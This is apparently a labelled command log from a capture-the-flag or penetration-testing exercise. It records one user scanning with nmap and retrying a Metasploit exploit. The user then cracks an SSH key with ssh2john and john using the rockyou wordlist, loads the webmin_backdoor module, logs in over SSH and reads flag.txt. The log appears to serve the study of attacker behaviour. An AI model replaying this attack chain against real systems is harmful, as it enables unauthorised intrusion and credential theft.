User 43 start time 1594797823 end 1594805341
PADDING
PADDING
PADDING
INPUT|43--0|M0 |1594797823|43|nmap 172.18.1.5|OUTPUT
INPUT|43--76|U|1594803026|43|set RHOST 192.168.1.5|OUTPUT
INPUT|43--77|U|1594803049|43|exploit|OUTPUT
INPUT|43--78|U|1594803251|43|set RHOST 172.18.1.5|OUTPUT
INPUT|43--79|U|1594803383|43|exploit|OUTPUT
INPUT|43--80|U|1594803415|43|show options|OUTPUT
INPUT|43--81|U|1594803421|43|set TARGET 0|OUTPUT
INPUT|43--82|U|1594803949|43|exploit|OUTPUT
INPUT|43--83|U|1594804398|43|show options|OUTPUT
INPUT|43--84|U|1594804404|43|set TARGET 0|OUTPUT
INPUT|43--85|U|1594804439|43|exploit|OUTPUT
INPUT|43--86|U|1594804446|43|set TARGET 0|OUTPUT
INPUT|43--87|U|1594804538|43|pwd|OUTPUT
INPUT|43--88|U|1594804557|43|exploit|OUTPUT
INPUT|43--89|U|1594804585|43|set TARGET 0|OUTPUT
INPUT|43--90|U|1594804628|43|exploit|OUTPUT
INPUT|43--91|U|1594804691|43|set TARGET 0|OUTPUT
INPUT|43--92|U|1594804746|43|touch key.txt|OUTPUT
INPUT|43--93|U|1594804787|43|cd|OUTPUT
INPUT|43--94|A10 |1594804787|43|ls|OUTPUT
INPUT|43--95|A14 A16 |1594804815|43|./ssh2john.py ~/Desktop/key.txt > hash|OUTPUT
INPUT|43--96|A10 |1594804817|43|ls|OUTPUT
INPUT|43--97|A14 |1594804848|43|man john|OUTPUT
INPUT|43--98|M14 |1594804885|43|john --wordlist=/usr/share/wordlists/rockyou.txt hash|OUTPUT
INPUT|43--99|U|1594804992|43|msfconsole|OUTPUT
INPUT|43--100|U|1594805028|43|use /exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|43--101|U|1594805044|43|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|43--102|U|1594805059|43|show options|OUTPUT
INPUT|43--103|U|1594805074|43|set RHOST 172.18.1.5|OUTPUT
INPUT|43--104|U|1594805080|43|set TARGET 0|OUTPUT
INPUT|43--105|U|1594805088|43|ifconfig|OUTPUT
INPUT|43--106|U|1594805106|43|set LHOST 10.1.135.83|OUTPUT
INPUT|43--107|M16 |1594805144|43|ssh -i key.txt eve@10.1.17.45|OUTPUT
INPUT|43--108|U|1594805161|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--109|U|1594805207|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--110|A15 |1594805227|43|chmod 777 key.txt|OUTPUT
INPUT|43--111|U|1594805232|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--112|A15 |1594805261|43|chmod 400 key.txt|OUTPUT
INPUT|43--113|U|1594805266|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--114|A10 |1594805335|43|ls|OUTPUT
INPUT|43--115|U|1594805338|43|cd top-secret/|OUTPUT
INPUT|43--116|A10 |1594805338|43|ls|OUTPUT
INPUT|43--117|M17 |1594805341|43|cat flag.txt|OUTPUT
